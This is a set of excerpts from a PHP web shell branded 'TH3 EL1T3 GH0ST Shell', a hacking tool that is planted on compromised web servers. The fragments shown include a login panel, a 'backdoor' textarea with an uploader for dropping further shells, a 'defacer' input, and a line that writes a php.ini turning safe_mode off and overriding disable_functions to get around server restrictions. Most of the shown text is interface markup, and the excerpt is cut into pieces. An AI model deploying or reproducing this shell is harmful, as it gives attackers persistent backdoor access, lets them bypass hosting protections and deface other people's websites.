...
<title>~ TH3 EL1T3 GH0ST Shell-v'.__GH0ST_VERSION__.'-'.__GH0ST_CODE_NAME__.' ~</title><center>
<center><img style="border-radius:100px;" width="500" height="250" alt="TH3 EL1T3 GH0ST  2012" draggable="false" src="https://envs.sh/Qol.jpg" /></center>
<div id=loginbox><p><font face="verdana,arial" size=-1>
<center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
<tr><td bgcolor="green"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="green" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>~ TH3 EL1T3 GH0ST  Shell-v'.__GH0ST_VERSION__.'-'.__GH0ST_CODE_NAME__.' ~</b></font></th></tr>
...
<title>..:: '.$_SERVER['HTTP_HOST'].' ~ TH3 EL1T3 GH0ST  Shell - v'.__GH0ST_VERSION__.'-'.__GH0ST_CODE_NAME__.' ::..</title>
<style type="text/css">';?>
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="TH3 EL1T3 GH0ST  2012" draggable="false" src="https://envs.sh/Qol.jpg" /></td>
</tr>
<tr>
...
function __showicon($r){
	$s['btn']='https://envs.sh/Qol.jpg';
	$s['GH0STmini']='https://envs.sh/Qol.jpg';
...
$textarea = "<div style='display:none;' id='backdoor_textarea'><div class='txtfont'>Your Shell:</div><p><textarea name='shell' rows='19' cols='103'><?php\n\techo('TH3 EL1T3 GH0ST  is Here...!');\n?></textarea></p></div>";
$select = "<div class='txtfont'>Use:</div> <select name='method' style='width:155px;' onChange='inBackdoor(this);'><option value='GH0ST'>TH3 EL1T3 GH0ST  Uploader</option><option value='my'>My Private Shell</option></select>";
...
$template = '<tr><td style="text-align:center;"><a href="https://envs.sh/Qol.jpg" target="_blank"><font color="#00FF00">Help</font></a></td><td style="text-align:center;"><div class="tbltxt">{index}</div></td><td><div class="tbltxt" style="margin-left:5px;">{target}:</div></td><td><input style="width:60px;" multi="{multi}" id="gui_{target}" onChange="colorHandler(this);" target=".{target}" type="color" value="{color}"></td><td><input type="text" style="text-align:center;" multi="{multi}" onkeyup="colorHandlerKey(this);" target=".{target}" id="input_{target}" class="colors_input" placeholder="#ffffff" value="{color}"></td></tr>';
$x = 1;
foreach($GLOBALS['__GH0ST_COLOR__'] as $key => $value){
	$multi = "";
	if(is_array($value)){
...
if(empty($about_us)){
$about_us = "<pre><center><img src='https://envs.sh/Qol.jpg'><br>
<b><font size='+3' color='#00A220'>&#9774; ~ PEACE ~ &#9774;</font><br><b>
<font color='#00A220'>Shell Coded By Sole Sad & Invisible (TH3 EL1T3 GH0ST )</font><br>
...
@__write_file($GLOBALS['cwd']."php.ini","safe_mode=OFF\ndisable_functions=ByPassed By Sole Sad & Invisible(TH3 EL1T3 GH0ST )");
...
<input type="text" name="defacer" size="67" id="text" placeholder="TH3 EL1T3 GH0ST  2012" />
<br>
